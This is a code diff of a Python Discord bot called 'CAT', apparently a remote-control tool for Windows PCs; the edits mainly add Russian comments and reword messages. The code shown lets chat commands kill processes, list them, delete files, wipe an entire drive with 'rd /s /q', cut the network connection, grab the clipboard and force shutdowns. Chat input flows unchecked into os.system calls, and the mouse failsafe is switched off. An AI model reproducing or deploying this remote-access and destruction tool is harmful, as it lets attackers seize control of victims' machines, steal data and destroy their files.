@@ -1,5 +1,6 @@
 # Made by nullifiedvlad
 
+# Импорт библиотек
 import discord
 from discord.ext import commands
 import pyautogui as pg
@@ -10,14 +11,14 @@ import config
 from datetime import datetime
 
 
-pg.FAILSAFE = False
+pg.FAILSAFE = False  # делает невозможным прервать движение мышки
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
 channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
 bot.remove_command('help')
 
 
 @bot.event
-async def on_ready():
+async def on_ready():  # cообщение при запуске
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
@@ -89,22 +90,21 @@ async def command(ctx, *, todo):
 
 
 @bot.command()
-async def kill(ctx, *, process):
+async def kill(ctx, *, process):  # убить процесс
     output = os.system(f'taskkill /im {str(process)} /f')
     if output == 0:
         await ctx.send('**CAT**: Процесс успешно убит!')
     else:
         await ctx.send('**CAT**: Такого процесса нет или вы указали непраильный процесс!')
-        del command
 
 
 @bot.command()
 async def processlist(ctx):  # список процессов
-    fl = open('processlist.txt', 'w')
+    f = open('processlist.txt', 'w')
     try:
         data = subprocess.check_output(['tasklist'])
-        fl.write(str(data))
-        fl.close()
+        f.write(str(data))
+        f.close()
         await ctx.send('**CAT**: Список процессов', file=discord.File('processlist.txt'))
         os.remove('processlist.txt')
     except FileNotFoundError:
@@ -112,26 +112,25 @@ async def processlist(ctx):  # список процессов
 
 
 @bot.command()
-async def delete(ctx, file_on_delete):  # удалиить файл
+async def delete(ctx, file_on_delete):  # удалить файл
     try:
         os.remove(str(file_on_delete))
+        await ctx.send(f'Файл "{file_on_delete}" успешно удалён!')
     except FileNotFoundError:
         await ctx.send('**CAT**: Такой файл не найден!')
-    finally:
-        await ctx.send(f'**CAT**: Файл "{str(file_on_delete)}"был успешно удалён!')
     del file_on_delete
 
 
 @bot.command()
 async def disk_kill(ctx, disk):  # форматирование диска
-    await ctx.send(f'**CAT**: Форматирую диск {disk}')
+    await ctx.send(f'**CAT**: Форматирую диск **{disk}**!')
     os.system(f'rd/s/q {disk}:\\ ')
     del disk
 
 
 @bot.command()
 async def disable_internet(ctx):  # отключить интернет
-    await ctx.send('**CAT**: Отключаю интернет соединение')
+    await ctx.send('**CAT**: Отключаю интернет соединение...')
     os.system(config.disable_internet)
 
 
@@ -158,13 +157,13 @@ async def clipboard_grab(ctx):
 
 
 @bot.command()
-async def shutdown(ctx):
+async def shutdown(ctx):  # выключение пк
     await ctx.send('Выключаю компьютер...')
     os.system('shutdown -s -t 0 >null')
 
 
 @bot.command()
-async def reboot(ctx):
+async def reboot(ctx):  # перезагрузка
     await ctx.send('Перезагружаю компьютер...')
     os.system('shutdown -r -t 0 >null')
 
